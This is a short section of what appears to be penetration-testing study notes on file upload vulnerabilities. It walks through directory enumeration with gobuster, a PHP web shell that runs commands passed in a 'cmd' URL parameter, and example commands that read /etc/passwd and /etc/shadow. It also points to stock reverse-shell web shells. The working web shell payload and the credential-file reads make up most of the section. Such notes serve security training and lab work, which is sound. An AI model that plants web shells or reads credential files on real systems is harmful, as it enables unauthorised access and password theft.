## 7. CFILE AND RESOURCE ATTACKS

### 7.1. BASIC FILE UPLOAD VULNERABILITIES

- **Actions**:
  1. Upload the file and check the url with the folders → Go to gobuster
  2. Gobuster command → ```dir --url [url] (without path) --wordlist usr/share/wordlists/dirb/common.txt```
  3. Check if it allows directory listing by accessing the url
  4. Check file extensions in Burp Suite → add a php payload → save on desktop
    ```php
        $output = shell_exec($_GET["cmd"]);
        echo "<pre>$output</pre>";
    ```
  5. Upload the file
  6. Cmd will contain the command for the injection
    - Examples
        - ```id```
        - ```whoami```
        - ```ls /var/www/html```
        - ```cat /etc/passwd```
        - ```cat /etc/shadow```
        - ```cat /etc/*release```
  7. Reverse shells
    - Webshells: ```cd /usr/share/webshells/php``` 
    - Change IP in target folder